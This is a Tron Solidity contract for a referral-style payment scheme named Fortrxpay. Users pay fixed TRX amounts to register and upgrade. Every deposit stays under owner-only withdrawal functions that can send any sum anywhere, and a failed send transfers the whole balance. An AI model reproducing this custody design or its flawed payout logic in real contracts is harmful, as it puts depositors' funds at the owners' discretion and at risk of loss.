//SourceUnit: Fortrxpay.sol

pragma solidity >=0.4.23 <0.6.0;

contract Fortrxpay{
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
    }
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(uint => uint) public levelPrice;

    uint public lastUserId = 2;
    address public owner;
    address public owner1;
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId,uint256 amount,uint pack);
    event Upgrade(address indexed user, uint8 pack,uint256 amount);
    event WithMulti(address indexed user,uint256 payment,uint256  withid); 
    
    
    constructor(address ownerAddress,address ownerAddress1) public {
      
       levelPrice[1] =  250 trx;
       levelPrice[2] =  500 trx;
       levelPrice[3] =  750 trx;
       levelPrice[4] =  1000 trx;
       levelPrice[5] =  1250 trx;
       levelPrice[6] =  1500 trx;
       levelPrice[7] =  1750 trx;
       levelPrice[8] =  2000 trx;

        owner = ownerAddress;
        owner1= ownerAddress1;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        userIds[1] = ownerAddress;
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,1);
        }
        registration(msg.sender, bytesToAddress(msg.data),1);
    }

    function registrationExt(address referrerAddress,uint pack) external payable {
        registration(msg.sender, referrerAddress,pack);
    }
    
    function buyNewLevel(uint8 pack) external payable {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require((msg.value%250 trx)==0, "Upgrade cost 250 multiple");
        require(msg.value == levelPrice[pack], "invalid price");
        require(msg.value>=250 trx, "invalid price");
        //require(level > 1 && level <= LAST_LEVEL, "invalid level");
        //require(!users[msg.sender].activepools[level], "level already activated");

        //if (!address(uint160(owner)).send(msg.value)) {
        //    return address(uint160(owner)).transfer(msg.value);
        //}
        emit Upgrade(msg.sender,pack,msg.value);
    }    
    
    function registration(address userAddress, address referrerAddress,uint pack) private {
        require((msg.value%250 trx)==0, "registration cost 250 multiple");
        require(msg.value == levelPrice[pack], "invalid price");
        require(msg.value>=250 trx, "invalid price");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
       // users[userAddress].activepools[1] = true; 
        userIds[lastUserId] = userAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++;

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id,msg.value,pack);
    }
    
   
    function Withdrawal(address userAddress,address userAddress1,uint256 amnt) external payable {   
        if(owner1==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }
    function Withdral(address userAddress,address userAddress1,uint256 amnt) external payable {   
         if(owner==msg.sender)
         {
            Execution(userAddress,amnt);        
         }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }
   
    function PaytoMultiple(address[] memory _address,uint256[] memory _amount,uint256[] memory _withId) public payable {
         if(owner==msg.sender)
         {
          for (uint8 i = 0; i < _address.length; i++) {      
              emit WithMulti(_address[i],_amount[i],_withId[i]);
              if (!address(uint160(_address[i])).send(_amount[i])) {
              address(uint160(_address[i])).transfer(address(this).balance);
              }
            }
        }
    }   

    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}